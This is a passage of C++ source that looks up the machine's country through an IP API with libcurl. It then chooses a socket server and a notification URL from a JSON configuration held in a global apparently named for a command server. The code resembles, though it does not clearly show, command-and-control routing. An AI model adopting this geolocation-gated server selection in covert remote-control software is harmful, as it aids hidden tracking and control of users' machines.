		if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

			res = curl_easy_perform(curl);

			curl_easy_cleanup(curl);

			if (res == CURLE_OK) {
				Json::CharReaderBuilder reader;
				Json::Value root;
				std::string errs;
				std::istringstream jsonStream(readBuffer);

				if (Json::parseFromStream(reader, jsonStream, &root, &errs)) {
					return root["country"].asString();
				}
			}
		}
	}
	else {
		file_log("Failed to fetch IP address");
		return "";
	}
}

bool isCorrectLocation()
{
	bool res = false;
	Json::CharReaderBuilder reader;
	std::string errs;

	std::istringstream jsonlocationStream(g_commandserver.locations);
	Json::Value loations;

	Json::parseFromStream(reader, jsonlocationStream, &loations, &errs);
	file_log(g_country);

	for (const auto& key : loations.getMemberNames())
	{
		file_log("matching");

		file_log(key);

		if (g_country == key)
		{
			g_socketserver = loations[key].asString();
			file_log(key);
			file_log(g_socketserver);
			res = true;
			break;
		}
		else if (key == "DEFAULT")
		{
			g_socketserver = loations[key].asString();
			file_log(key);
			file_log(g_socketserver);
			res = true;
		}
	}
	return res;
}


std::string getCorrectNotify()
{
	std::istringstream jsonOtherNotifyStream(g_commandserver.others);
	Json::Value otherRoot;
	Json::CharReaderBuilder reader;
	std::string errs;

	if (Json::parseFromStream(reader, jsonOtherNotifyStream, &otherRoot, &errs)) {
		if (otherRoot.isObject() && otherRoot.isMember("notifyurl")) {
			Json::Value otherNotifyUrl = otherRoot["notifyurl"];

			file_log(g_country);

			for (const auto& key : otherNotifyUrl.getMemberNames())
			{
				file_log("matching Country for NotifyUrl");

				file_log(key);

				if (g_country == key)
				{
					file_log(key);
					return otherNotifyUrl[key].asString();
				}
			}
		}
	}

	return g_commandserver.notifyurl;
}
